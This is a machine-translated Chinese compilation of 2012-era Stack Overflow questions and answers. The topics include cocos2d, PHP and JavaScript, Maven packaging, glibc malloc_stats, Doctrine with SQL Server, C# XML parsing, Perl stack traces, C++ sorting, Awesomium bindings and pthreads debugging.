请注意，每分钟下载一次相同的 PDF 文件可能是一个愚蠢的想法，尽管......

# cocos2d-iphone - ccSpriteBatchNode 子边界框变换

> ID：13280704
> 
> 赞同：1
> 
> 时间：2012-11-08T00:35:24.083
> 
> 标签：cocos2d-iphone, rotation, bounding-box, ccspritebatchnode

我正在使用 cocos2d 1.0.1。

我创建了一个 CCSpriteBatchNode，它包括一个 CCSprite（我们将其命名为 parentLayer），其中包括一些 X 个子节点（CCSprites）。

问题是 - 当我旋转 parentLayer 时，所有精灵（子）都正确显示，但是边界框在同一个地方（旋转前它们所在的位置），所以这些精灵的世界坐标不会改变。

当然，如果没有 CCSpriteBatchNode，以上所有方法都可以很好地工作。但是，由于涉及的精灵数量，我想使用批处理节点。

问题是，有没有办法相应地更新边界框和子位置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T08:41:34.310

我们在谈论多少个精灵？我只会使用快速枚举调用来单独旋转每个。我从来没有注意到这样做时性能受到影响，你呢？

```
CCArray *listOfChildren = [parentLayer children];
for (CCSprite *sprite in listOfChildren) {
    [sprite setRotation:someValue];
} 
```

# php - 将php插入js文件

> ID：13280707
> 
> 赞同：2
> 
> 时间：2012-11-08T00:35:45.613
> 
> 标签：php, javascript, image

我的网站上有画廊的加载 gif。在我的 js 文件中，我有这段代码来显示加载器：

```
image: $("<img src='images/loading.gif'/>"), 
```

目前这个图像没有出现，因为我没有放置完整的图像路径。但与其放置完整的图像路径，我更愿意这样做：

```
<img src="<?php bloginfo('url');?>/images/loading.gif”&gt; 
```

但我不知道如何让这个 php 在我的 js 文件中工作。我该如何以最简单的方式进行操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:56:47.833

我更喜欢..

**1）**在我的标头包含（包含任何 <head> 数据的 php 包含）中，编写一个小的内联 JS 函数，该函数创建一个包含我需要从服务器（PHP）获得的任何变量的全局对象。我可以在这里使用 'echo' 和 'json_encode' 函数，因为它位于 php 文件的内联 JS 片段中。

**2）**你可以在你的JS文件中编写一个JS函数，使用AJAX调用一个PHP文件，它将返回与数字1相同的JSON编码数据，然后你解析它并分配给一个全局变量。

两者基本上都做同样的事情，除了 2 您使用的是 AJAX，这将添加一个额外的请求。我更喜欢选项 1，因为它是与页面执行一起完成的。选项 2 可能需要您等到 DOM 准备好，这取决于您的程序的各个方面（我无法确定）。

选项 1 需要内联 JS，但您真的不应该对此大谈特谈，因为对于动态网站，它实际上可能是一个加分项，因为它简短而简洁。有些人对内联 JS 有所了解。不要让他们对你大喊大叫。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:56:29.623

我不完全确定您要做什么。但是如果那个 JS 不工作，为什么不包含一个 php 文件，或者只是在标题中写一些 php，在 'echo()' 中包含其中的 JS。IE：

```
 echo('?><img src="<?php bloginfo('url');?>/images/loading.gif" /><?php'); 
```

如果我误解了您的意图，请纠正我。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T01:00:25.763

您不能将 PHP 代码直接放入 .js 文件中，但您可以在包含 javascript 文件之前在 PHP 文件的 head 元素中添加一些 javascript。

在这个 javascript 中，您可以使用 PHP 定义变量并为它们分配数据。然后可以从 javascript 文件内部访问这些变量。

```
<head>
    <script type='text/javascript'>
       var _g_bloginfo = "<?php echo '...'; ?>";
    </script>

    <script type='text/javascript' src='javascript.js'></script>
</head> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T01:25:26.003

将 PHP 数据传递给 JavaScript 的一种**更简洁**的技术是将数据存储在[数据属性](http://dev.opera.com/articles/view/an-introduction-to-datasets/)中，然后您可以通过 JavaScript 访问这些属性。举个简单的例子：

```
<body data-home-url="<?php echo home_url(); ?>"> 
```

您可以像这样在 jQuery 中访问它：

```
var home = $('body').attr('data-home-url'); 
```

仅供参考，您可以使用[json_encode](http://php.net/manual/en/function.json-encode.php)将 PHP 对象/数组转换为 JSON 对象，您可以通过[$.parseJSON](http://api.jquery.com/jQuery.parseJSON/)或[JSON.parse](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/JSON/parse)读取这些对象。WP 的[wp_localize_script](http://codex.wordpress.org/Function_Reference/wp_localize_script)实际上可以为您执行此操作，但请注意，在这种情况下，它会将转换后的数据公开给[window](https://developer.mozilla.org/en-US/docs/DOM/window)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-08T01:44:47.497

您可以创建一个 php 文件（而不是您的 js 文件，其中包含您在该 js 文件中已有的所有代码 + 对您的 php 变量/函数的引用）并将其包含在您的主 php 文件中。

### 示例 html：

```
<?php $example = 23; ?>
<html>
<head><title></title>
<script type="text/javascript">
<?php include('js.php'); ?>
</script>
</head>
<body></body>
</html> 
```

### js.php：

```
var a = <?= $example ?>;
alert(a); 
```

### 最终会输出：

* * *

```
<html>
<head><title></title>
<script type="text/javascript">
    var a = 23;
    alert(a);
</script>
</head>
<body></body>
</html> 
```

# java - 压缩项目的 POM

> ID：13280708
> 
> 赞同：0
> 
> 时间：2012-11-08T00:35:52.053
> 
> 标签：java, maven

是否可以创建一个 POM，在打包或更高版本中，仅将整个项目组装起来（例如，放入一个 zip 文件）并将其放置在目标中？

在这种情况下，项目中没有任何 Java 代码，它只是一组我想要打包的脚本和文件。为了统一起见（因为我们的商店都是 Maven），我真的很想有一个 POM 来做这件事，因为目前，我们有一个 shell 脚本来做这件事。

例子将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T01:14:05.923

所以我最终得到了以下内容，它创建了一个文件并且对我有用`ServerSetupTools-0.1-SNAPSHOT.tar.gz`。`target`唯一的缺点是我不确定如何让它在根目录中提取文件，所以我将它们全部移动到`src/main/resources`，这对我也有用。希望这对其他人有帮助。

POM 文件：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
<modelVersion>4.0.0</modelVersion>
<artifactId>ServerSetupTools</artifactId>
<packaging>pom</packaging>
<name>ServerSetupTools</name>
<url>http://maven.apache.org</url>
<groupId>com.mycompany.utilities</groupId>
<version>0.1-SNAPSHOT</version>
<build>
    <plugins>
        <!--  Run assembly as part of packaging -->
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-assembly-plugin</artifactId>
            <version>2.2-beta-5</version>
            <configuration>
                <appendAssemblyId>false</appendAssemblyId>
                <descriptors>
                    <descriptor>
                        src/main/assembly/assemble.xml
                    </descriptor>
                </descriptors>
            </configuration>
            <executions>
                <execution>
                    <id>make-assembly</id>
                    <phase>package</phase><!-- append to the packaging phase. -->
                    <goals>
                        <goal>single</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build> 
```

`src/main/assembly/assemble.xml`：

```
<assembly xmlns="http://maven.apache.org/xsd/assembly"
xsi:schemaLocation="http://maven.apache.org/xsd/assembly-1.0.0.xsd">
<id>dist</id>
<formats>
    <format>tar.gz</format>
</formats>
<includeBaseDirectory>false</includeBaseDirectory>
<fileSets>
    <fileSet>
        <includes>
            <include>*</include>
        </includes>
        <directory>src/main/resources</directory>
        <outputDirectory>bin</outputDirectory>
        <fileMode>0755</fileMode>
    </fileSet>
</fileSets> 
```

# php - 创建后如何设置输入类型的值

> ID：13280711
> 
> 赞同：0
> 
> 时间：2012-11-08T00:36:45.020
> 
> 标签：php

我有一个基本问题，我找不到答案。

我有一个输入文本

每次单击按钮时，我都想更改值 by1。

所以，当我制作一个新士兵时，我希望它显示在士兵计数中。

我最近开始用 PhP 编程。

在 Java 中，我正在寻找的命令将是一些 setText 或类似的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T01:23:10.287

这是基本思想：

您特别提到了 PHP，所以我会给您一个 PHP 示例：这是您希望表单出现的每个页面的顶部...

```
<?php
session_start();
if(!isset($_SESSION['soldiers']))
    $_SESSION['soldiers'] = 0;

include('form_process.php'); 
```

然后在 form_process.php 中：

```
 <?php

        if(isset($_POST['soldiers']) && is_numeric($_POST['soldiers']))
        {
            if($_POST['soldiers'] == $_SESSION['soldiers'])
                $_SESSION['soldiers'] ++;
            else
                $_SESSION['soldiers'] = $_POST['soldiers'];
        }

?>
<form id="soldiers" action="" method="post">
    <input type="text" name="soldiers" value="<?php echo $_SESSION['soldiers']; ?>">
    <input type="submit" name="submit" value="submit">
</form> 
```

我会亲自在 html 和 jquery 中执行此操作，但是您要求使用 PHP，所以您就可以了。

为什么要使用会话？因为你说表格在每一页上，所以你需要在整个会话期间保持一个恒定的数字。最好使用数据库，这样所有可能正在查看该网站的人的数量都是恒定的，但您没有在问题中指定这一点。

我自己不知道这样的东西在它所处的状态下可能有什么价值。对我来说，听起来你想要一种 javascript 类型的方式来更新点击时元素的 html，这比递增更有意义用户可以手动覆盖的输入值。但是，嘿，编程的美妙之处在于它永远不需要对任何人说任何话，只要你能从中得到你想要的任何东西。

# linux - 如何在 Linux 上的 C 程序中使用 malloc_stats

> ID：13280714
> 
> 赞同：3
> 
> 时间：2012-11-07T15:14:46.777
> 
> 标签：linux, memory, c, gdb

我试图通过在 Linux 上运行的 C 程序中调用 malloc_stats() 来打印内存分配统计信息。但是它不提供任何输出。根据 malloc_stats() 的手册页，信息被发送到标准错误。那么如何将 malloc_stats() 信息重定向到我的程序的日志文件？

我也尝试在 gdb 中调用 malloc_stats() 但这也没有给我正确的信息：

```
(gdb) call malloc_stats()
[Switching to Thread 182928084768 (LWP 11950)]
$2 = -1759135936
(gdb) 
```

我的 gdb 有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T19:11:50.573

您无法更改输出的去向，如果您想在其他地方`malloc_stats`重定向，您需要重定向`stderr`自己（例如使用）。`freopen`

如果您有足够新的 glibc (>= 2.10)，则可以使用[`malloc_info(3)`](http://man7.org/linux/man-pages/man3/malloc_info.3.html)将 a`FILE*`作为其参数之一（并输出 XML）。结合它，[`open_memstream(3)`](http://man7.org/linux/man-pages/man3/open_memstream.3.html)你可以在内存缓冲区中得到它。

（我不知道你的有什么问题`gdb`，我的打印统计数据就好了 - GDB 7.3.1，glibc 7.15。）

# php - Doctrine 和 MS SQL 2008 的 SELECT 问题

> ID：13280717
> 
> 赞同：3
> 
> 时间：2012-11-08T00:37:20.987
> 
> 标签：php, sql-server, sql-server-2008, doctrine-orm, freetds

我们使用 Doctrine2 编写了一个应用程序，它在与 MySQL 或 Postgres 数据库一起使用时效果很好。

[现在，我们使用PDO 驱动程序 DBLib](http://de3.php.net/manual/en/ref.pdo-dblib.php)将应用程序与 SQL Server 2008 数据库连接起来，该数据库使用`FreeTDS`由 SQL Server 和 Sybase 共享的 TDS（表格数据流协议）的实现。

在对 Doctrine和我们的 MSSQL 驱动程序包进行了一些调整之后，初始模式创建、事务和`INSERT`表中的 s 工作正常。`SQLServerPlatform`

但是在选择数据的时候，我们会遇到如下错误：

```
General error: 20019 Attempt to initiate a new Adaptive Server operation with results pending 
```

经过大量的谷歌搜索，我[在 FreeTDS 的常见问题解答中找到了这个细节](http://www.freetds.org/faq.html#pending)：

> 如果您习惯于使用其他数据库服务器进行编程，那么当您第一次遇到 TDS 协议的这一方面时，您可能会感到惊讶。[...]
> 
> 服务器要求客户端要么读取查询的所有结果，要么指示不需要更多行，即发出取消。在这两种情况之一发生之前​​，服务器不会接受该连接上的新查询。它会抱怨“未决结果”。

所以错误消息的原因是由于某种原因，Doctrine (DBAL->PDO->FreeTDS) 没有从连接缓冲区中读取所有结果行，并且服务器/库不允许应用程序发出新的`exec()`/`execute()`直到读取所有行。

*   我的理解是否正确，`$doctrinequery->getResults()`在返回之前获取所有结果？
*   我的理解是否正确`$entity->getLinkedEntity()`（即`$user->getGroupNames()`）在返回之前获取所有结果？
*   您将如何解决问题的确切位置？
    堆栈跟踪根本没有帮助我们，代码库已经增长。
*   有没有其他人已经遇到这个问题并且可以分享一些见解？
*   我们可以使用其他替代方法将 Doctrine 连接到不受此问题影响的 MSSQL 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-16T09:28:17.987

我对 PDO Driver DBLib 和事务也有类似的问题。我这样修复它：

```
$this->_db->beginTransaction();

$st = $this->_db->prepare("StoredProcedure ?");
$st->execute(array($data));
$results= $st->fetchAll();
$st->closeCursor();

// more stuff

$this->_db->commit(); 
```

`closeCursor()`解决了我的问题： http: [//php.net/manual/en/pdostatement.closecursor.php](http://php.net/manual/en/pdostatement.closecursor.php)

# c# - 如何读取特定名称的所有 XML 节点并将它们放入数组（或列表）中？

> ID：13280719
> 
> 赞同：2
> 
> 时间：2012-11-08T00:37:28.870
> 
> 标签：c#, .net, xml, linq, xpath

我有一个 XML：

```
<?xml version="1.0" encoding="UTF-8"?>
<ticket>
    <comments type="array">
         <comment> 
               <attachments type="array">
                     <attachment>
                          <url>I NEED WHATEVER IS IN HERE</url>
                     </attachment>
               </attachments>
         </comment>
         <comment>
               <attachments type="array">
                     <attachment>
                          <url>I NEED WHATEVER IS IN HERE</url>
                     </attachment>
               </attachments>
         <comment>
     </comments>
</ticket> 
```

我将如何获取 URL 标记内的任何内容并将其添加到`<List>`? 我正在使用 C#。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:46:43.533

利用：

```
var result = XDocument.Parse(inputXml)
    .DescendantNodes().OfType<XText>().Select(e => e.Value).ToList(); 
```

或使用 XPath：

```
var result = ((IEnumerable)XDocument.Parse(input).XPathEvaluate("//text()"))
    .Cast<XText>().ToList(); 
```

要仅从`url`元素中检索文本，请使用：

```
var result = XDocument.Parse(inputXml)
        .Descendants("url").Select(e => e.Value).ToList(); 
```

或更改以上 XPath：`//url/text()`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:46:26.753

```
using (StringReader sr = new StringReader(xml_content))
{
    XDocument xdoc = XDocument.Load(sr);

    IList<string> values = xdoc.XPathSelectElements("ticket/comments/attachments/url").Select(e => e.Value).ToList();
} 
```

或者，根据您评论中的用例：

```
var doc = new XmlDocument();
doc.LoadXml(xml_content);
IList<string> values = doc.SelectNodes("ticket/comments/attachments/url")
    .Cast<XmlElement>().Select(e => e.InnerText).ToList(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-06T02:29:17.883

或者你可以使用 var values = xdoc.SelectSingleNode("ticket/comments/attachments/url").InnerXml;

# php - 在 Java 中处理从 PHP 传递的关联数组

> ID：13280720
> 
> 赞同：1
> 
> 时间：2012-11-08T00:37:34.327
> 
> 标签：php, jsp

您好我正在尝试在 POST 请求中将关联数组发送到 JSP servlet。如何在 servlet 中处理该数组。我还能做到吗？我只想将该 assoc 数组转换为 JSP 中的哈希集/表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:46:46.713

最简单的方法是发布一些 JSON，然后在 servlet 中使用 JSON。[Jackson 库](http://jackson.codehaus.org/)可以使用一行代码将 JSON 解组为 HashMap（或等效）。

如果您向我们提供一些示例数据，那么我可以建议一些代码......

# perl - 我可以让 Perl 不删除堆栈帧吗？

> ID：13280722
> 
> 赞同：3
> 
> 时间：2012-11-08T00:37:38.077
> 
> 标签：perl, stack-trace

我最近一直在编写一些代码来捕获整个代码库中的错误（IE 在我们的 Perl 代码的最顶层执行 try/catch）。令我苦恼的是，我发现 Perl 堆栈跟踪省略了堆栈帧！呸！我正在寻找这些堆栈帧消失的原因。caller() 的文档说堆栈帧可以“优化掉”。但实际上，让他们离开真是太烦人了。有没有办法诱使 Perl 包含它们？这样做会有性能损失吗？下面是一个简单的例子。如您所见，堆栈跟踪中既不包含 bar() 也不包含 bletch()。一个可悲的遗漏导致我不得不手动跟踪代码。

感激地收到任何见解。

伦纳德

这是 foo.pl

```
use strict;
use warnings;

use Devel::StackTrace;
use Try::Tiny;

foo();

sub foo {
    print "In foo\n";
    try {
        bar();
    }
    catch {
        my $trace = Devel::StackTrace->new();
        print $trace->as_string;
    };
}

sub bar {
    print "In bar\n";
    bletch();
    my $more_stuff = 123;
    return $more_stuff;
}

sub bletch {
    print "In bletch\n";
    my $not_so_defined;
    $not_so_defined->barf();
    print "Unlikely to be printed\n";

} 
```

这是运行 foo.pl 时打印的内容：

```
In foo
In bar
In bletch
Trace begun at foo.pl line 17
main::__ANON__('Can\'t call method "barf" on an undefined value at ./foo.pl line 32.^J') called at /vcm/home/apps/perl-5.12.1/lib/site_perl/5.12.1/Try/Tiny.pm line 100
Try::Tiny::try('CODE(0xf503a0)', 'Try::Tiny::Catch=REF(0x1035ca0)') called at foo.pl line 19
main::foo at foo.pl line 9 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:54:30.550

在我看来，好像没有。至少，不会缺少在调用堆栈中创建更深的堆栈帧，例如在错误点，或者使用不那么笨拙的 try/catch 实现。

Try::Tiny 只是一个非常薄的`eval`. 这意味着，它基本上评估`try`子然后运行`catch`子如果`$@`是真的。当`catch`子程序运行时，`try`“块”*已经返回*并且堆栈帧已经消失。没有优化掉——只是*消失了*。的`eval`返回已经杀死了它正在评估的堆栈帧。您真正剩下的只是`$@`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T01:50:41.167

> 下面是一个简单的例子。如您所见，堆栈跟踪中既不包含 bar() 也不包含 bletch()。

是的，因为您已经退出`bar`并且`bletch`在获取堆栈跟踪之前。

创建一个`$SIG{__DIE__}`处理程序。

# javascript - 给定 ISO 8601 日期/时间，如何使用 JS date() 获取星期几（0-6）？

> ID：13280724
> 
> 赞同：1
> 
> 时间：2012-11-08T00:37:44.763
> 
> 标签：javascript, jquery, date, datetime

给定一个日期时间字符串，如下所示：

```
mystring = '2012-10-23T02:40:59Z' 
```

我需要能够从字符串中获取星期几（0-6）。

如何将上述内容传递给 JS，以便可以执行以下操作：

```
var d = new Date(mystring);
var n = d.getDay();
console.log(n) 
```

其中 n 返回 0-6。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T01:09:46.403

虽然 Date 对象应该能够[解析 ECMA-262 中的 ISO 8601 格式](https://tc39.es/ecma262/#sec-date-time-string-format)，但它不能跨浏览器可靠地工作，因此您最好手动解析它们：

```
function isoStringToDate(s) {
  var b = s.split(/\D/);
  return new Date(Date.UTC(b[0], --b[1], b[2], b[3]||0, b[4]||0, b[5]||0, b[6]||0));
} 
```

然后您可以使用该[`getDay`](http://ecma-international.org/ecma-262/5.1/#sec-15.9.5.16)方法获取日期编号（星期日 = 0，星期六 = 6）：

```
isoStringToDate('2012-10-23T02:40:59Z').getDay(); // 2 for me 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:51:12.797

做你提议的！

[`Date - getDay()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date/getDay)

> 根据当地时间返回指定日期的星期几。

# c++ - 对结构队列进行排序

> ID：13280726
> 
> 赞同：1
> 
> 时间：2012-11-08T00:38:00.490
> 
> 标签：c++, sorting, queue

我目前有一个队列，其中包含用户指定数量的名为**Process**的结构。进程由 pid、burst 和到达组成。我想按到达对队列进行排序，但我不知道从哪里开始。这里有一些伪代码来帮助说明我想说的：

```
struct Process{
    int pid;
    int burst;
    int arrival;
};

void function(int numProcesses){
    queue<Process> readyQueue;

    // The following loop is a shortened version of my code
    for(int i=0; i<numProcesses;i++){
        readyQueue.push(aProcess);
    }

    // This is where I need help!
    // sort(readyQueue);
} 
```

我会很感激任何可以为我指出如何做到这一点的正确方向的人，或者是否有可能。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:40:16.067

`std::sort`您可以使用'' 标头中的标准库进行排序。您可以提供一个比较器或定义一个较少的运算符。

```
struct Process{
    int pid;
    int burst;
    int arrival;
};

    bool operator<(const Process& a, const Process& b) {
          return a.arrival < b.arrival;
    }

    void function(int numProcesses){
        std::dequeue<Process> readyQueue;

        // The following loop is a shortened version of my code
        for(int i=0; i<numProcesses;i++){
             readyQueue.push_back(aProcess);
         }
        std::sort(readyQueue.begin(), readyQueue.end());       
    } 
```

[http://en.cppreference.com/w/cpp/algorithm/sort](http://en.cppreference.com/w/cpp/algorithm/sort)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T00:40:47.380

大多数情况下，您需要`operator<`为您的班级定义：

```
struct Process{
    int pid;
    int burst;
    int arrival;

    bool operator<(Process const &other) { return arrival < other.arrival; }
}; 
```

完成后，`std::sort`将正常工作：

```
std::sort(std::begin(readyQueue), std::end(readyQueue)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T00:43:59.540

您应该`std::priority_queue`改用...否则，每次将某些内容推到队列上时，您都必须对队列进行排序。

请注意，您仍然需要定义`operator<`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T00:45:55.023

您想实现一个日历队列。不要为此使用`queue`数据结构，而是`set`：

```
struct Process{
    int pid;
    int burst;
    int arrival;
    bool operator<(Process const& other) const {
      if (arrival == other.arrival) {
        if (pid == other.pid)
          return this < &other;
        return pid < other.pid;
      }
      return arrival < other.arrival;
    }
};

void func() {
  std::set<Process> myQueue;
} 
```

无需显式排序，该集合将始终保持内容排序，您始终可以通过迭代器删除第`erase`一个`begin()`。

# javascript - 我可以在 Awesomium 中从 JavaScript 调用应用程序方法吗？

> ID：13280727
> 
> 赞同：15
> 
> 时间：2012-11-08T00:38:04.370
> 
> 标签：javascript, awesomium

我在网上搜索了答案，但我一定问错了问题。我有一个带有 Awesomium Web 控件的 C# winforms 应用程序。我可以从加载页面中的 javascript 调用应用程序中定义的方法吗？如果是这样，怎么做？（示例 js 代码将不胜感激）。谢谢！

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-11-14T16:15:48.477

该方法取决于您使用的 Awesomium 版本。在即将发布的 1.7 版（目前为 1.7 RC3）和之前的版本中，这方面发生了一些变化。请注意，1.7 中有一个改进，即 .NET 方法现在可以在 JS 调用应用程序上的方法时返回值。我不相信这在 1.7 之前是可能的。

以下是两种方法：

test.html（用于两个版本）

```
...
<script type="text/javascript">

    function myMethod() {
        document.write("In myMethod, calling .NET but expecting no return value.<br/>");

        jsobject.callNETNoReturn();
    }

    function myMethodExpectingReturn() {
        document.write("In myMethodExpectingReturn, calling .NET and expecting return value.<br/>");

        var returnVal2 = jsobject.callNETWithReturn("foo");
        document.write("Got value from .NET: " + returnVal2 + "<br/>");
    }

    function myMethodProvidingReturn(whatToReturn) {
        var returnVal =  whatToReturn + "bar";
        document.write("Returning '" + returnVal + "' to .NET.");

        return returnVal;
    }
</script>
... 
```

**1.7 版**

Form1.cs

```
public Form1()
{
    InitializeComponent();

    //webView is an instance of WebControl defined in your form
    webView.DocumentReady += WebViewOnDocumentReady;

    webView.Source = new Uri("test.html");
}

private void WebViewOnDocumentReady(object sender, UrlEventArgs urlEventArgs)
{
    webView.DocumentReady -= WebViewOnDocumentReady;

    JSObject jsobject = webView.CreateGlobalJavascriptObject("jsobject");

    jsobject.Bind("callNETNoReturn", false, JSHandler);
    jsobject.Bind("callNETWithReturn", true, JSHandler);

    webView.ExecuteJavascript("myMethod()");
    webView.ExecuteJavascript("myMethodExpectingReturn()");
    var result = webView.ExecuteJavascriptWithResult("myMethodProvidingReturn('foo')");
    Console.WriteLine(result.ToString());
}

private void JSHandler(object sender, JavascriptMethodEventArgs args)
{
    if (args.MustReturnValue)
    {
        Console.WriteLine("Got method call with return request");
        args.Result = "Returning " + args.Arguments[0];
    }
    else
    {
        Console.WriteLine("Got method call with no return request");
    }
} 
```

**1.6版**

表格.cs

```
public Form1()
{
    InitializeComponent();

    //webView is an instance of WebControl defined in your form
    webView.DomReady += WebViewOnDomReady;

    webView.Source = new Uri("test.html");
}

private void WebViewOnDomReady(object sender, EventArgs eventArgs)
{
    webView.DomReady -= WebViewOnDomReady;

    webView.CreateObject("jsobject");
    webView.SetObjectCallback("jsobject", "callNETNoReturn", JSHandler);

    webView.ExecuteJavascript("myMethod()");

    var result = webView.ExecuteJavascriptWithResult("myMethodProvidingReturn('foo')");
    Console.WriteLine(result.ToString());
}

private void JSHandler(object sender, JSCallbackEventArgs args)
{
    Console.WriteLine("Got method call with no return request");
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-10T23:04:57.820

在 C++ 中：（.NET 绑定可能类似）

定义一个回调类：

```
class TestListener : public Awesomium::WebViewListener {
public:
    virtual void onCallback(
        Awesomium::WebView* caller,
        const std::wstring& objectName,
        const std::wstring& callbackName,
        const Awesomium::JSArguments& args
    ) {
        if (objectName == L"myApi" && callbackName == L"doMagicFoo") {
            cout << "callback called with " << args.size() << " args\n";
        }
    }

    //...implement all the other pure virtual functions...  
}; 
```

然后在设置 WebView 时：

```
TestListener bob;
webView->setListener(&bob);
webView->createObject(L"myApi");
webView->setObjectCallback(L"myApi", L"doMagicFoo"); 
```

然后在您的 HTML/JS 中：

```
<button onclick="myApi.doMagicFoo('super', 45)">do native call</button> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-20T14:38:09.510

对于较新的版本

**从 JavaScript 调用：**

```
webControl1.LoadingFrameComplete += LoadingFramecompleted;

public void LoadingFramecompleted(object sender, FrameEventArgs e){
    //after loading complete create global object
    JSObject obj = webControl1.CreateGlobalJavascriptObject("jsobject");
    obj.Bind(myMethod);
}

private JSValue myMethod(object sender, JavascriptMethodEventArgs e)
{
    MessageBox.Show("hello world");
    return "My response";
} 
```

JavaScript 内部

```
jsobject.myMethod(); //myMethod is the method name defined in c# 
```

**调用 JavaScript**

```
webControl1.ExecuteJavascript("SayHello()"); 
```

# c - 不使用 printf 时的段错误

> ID：13280732
> 
> 赞同：4
> 
> 时间：2012-11-08T00:38:38.980
> 
> 标签：c, linux, for-loop, segmentation-fault, printf

我正在使用 POSIX 线程，并且在我的程序结束时，我正在等待加入每个线程。经过一段时间的完美运行后，当我等待线程时，我的代码开始返回一个奇怪的错误。

```
pthreads threads[C+P];

for(i = 0; i < (C+P); i++)
{
    printf("%d\n", i);  
    pthread_join(threads[i]);
} 
```

如果我删除了 printf 语句，或者将其替换为任何其他 printf 语句、延迟或对 i 的任何其他操作，我仍然会遇到段错误。

我将如何开始调试呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T00:54:48.927

Inserting `printf()` call affects memory layout (and thus it can, by pure accident, mask some memory corruption), as well as execution timing (you use threads, so timing is also relevant).

But instead of any sort of guesswork, you should do some regular debugging:

*   run you executable under [gdb](http://www.gnu.org/software/gdb/), this way you should be able to see what exact operation is causing a crash, where is it called from, etc.

*   run it under [valgrind](http://valgrind.org/) - this tool detects a lot of common errors, like accessing free'd memory block, using uninitialized variables, exceeding array/buffer boundaries, etc. It's not uncommon to immediately get exact position of the error with `valgrind`, I highly recommend it!

# javascript - 将 javascript 幻灯片代码动态添加到模板化站点的标题中

> ID：13280734
> 
> 赞同：0
> 
> 时间：2012-11-08T00:39:10.490
> 
> 标签：javascript, jquery, flash

我正在使用一个非常过时的模板站点，它不允许我更改站点顶部的任何内容。Flash 幻灯片不再正常工作，所以我想知道是否有任何方法可以将 Javascript/JQuery 添加到网站的可访问部分，从而用我制作的 Javascript 幻灯片动态替换现有的 Flash 幻灯片？

该网站是： http: [//www.familymattersteam.com/](http://www.familymattersteam.com/)

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-09T19:55:24.667

我将以下代码添加到站点后端的“脚本页脚”部分。大约一周前我刚开始学习 Javascript，我从另一个过时的网站借用了这段代码，所以我确信它看起来很痛苦。它虽然有效！

基本上我所做的只是使用 innHTML 命令将“SlideShow”ID 中的内容替换为 Javascript 幻灯片的代码。

```
var t;
var slideShowSpeed = 5000;
var crossFadeDuration = 2;

var PicA = new Array();

PicA[0] = '/Repository/1/4/1/0/7/9/141079/template_files/slide1.jpg';
PicA[01] = '/Repository/1/4/1/0/7/9/141079/template_files/slide2.jpg';
PicA[02] = '/Repository/1/4/1/0/7/9/141079/template_files/slide3.jpg';
PicA[03] = '/Repository/1/4/1/0/7/9/141079/template_files/slide4.jpg';
PicA[04] = '/Repository/1/4/1/0/7/9/141079/template_files/slide5.jpg';

var j = 0;
var p = PicA.length; 
var preLoadA = new Array();

for (i = 0; i < p; i++) {
preLoadA[i] = new Image();
preLoadA[i].src = PicA[i];
};

function runSlideShowA() {

if (document.all) {
document.images.SlideShowA.style.filter='blendTrans(duration=2)';
document.images.SlideShowA.style.filter='blendTrans(duration=crossFadeDuration)';
document.images.SlideShowA.filters.blendTrans.Apply();
};

document.images.SlideShowA.src = preLoadA[j].src;

if (document.all) {
document.images.SlideShowA.filters.blendTrans.Play();
};

j = j + 1;
if (j > (p - 1)) j = 0;
t = setTimeout('runSlideShowA()', slideShowSpeed);
};

newSlide = document.getElementById('SlideShow'); 
newSlide.innerHTML = '<img src="/Repository/1/4/1/0/7/9/141079/template_files/slide1.jpg" name="SlideShowA" width="874" height="206">';

runSlideShowA(); 
```

# javascript - 带有变量的 JavaScript 重定向

> ID：13280735
> 
> 赞同：0
> 
> 时间：2012-11-08T00:39:22.900
> 
> 标签：javascript, jquery, variables, redirect, href

所以我有这个 JavaScript 函数 getSearchVariable，它基本上使用原始 Javascript 从 URL 获取一个变量。

我需要将用户重定向到一个带有 URL 的页面，该页面在变量之前和变量之后带有一些静态文本。

```
document.location.href="http://example.com/tracer?="+(getSearchVariable('Track')+"&tba=N" 
```

关于为什么像上面的代码这样的东西不起作用的任何想法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T00:40:17.783

你的括号不平衡。

```
document.location.href=
    "http://example.com/tracer?="+(getSearchVariable('Track')+"&tba=N"
//                                ^
